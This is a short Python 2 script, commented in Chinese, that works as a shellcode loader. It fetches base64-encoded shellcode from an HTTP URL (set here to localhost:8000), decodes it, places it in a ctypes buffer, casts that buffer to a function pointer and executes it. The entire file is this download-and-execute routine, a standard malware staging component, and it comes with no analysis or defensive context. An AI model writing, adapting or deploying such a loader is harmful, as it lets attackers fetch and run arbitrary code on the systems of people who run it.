# coding=utf-8
"""
shellcode执行
"""
import base64
import ctypes
import urllib2

# 从本地服务器上下载shellcode
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

# base64解码shellcode
shellcode = base64.b64decode(response.read())

# 申请执行的内存空间
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# 创建shellcode的函数指针
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# 执行
shellcode_func()
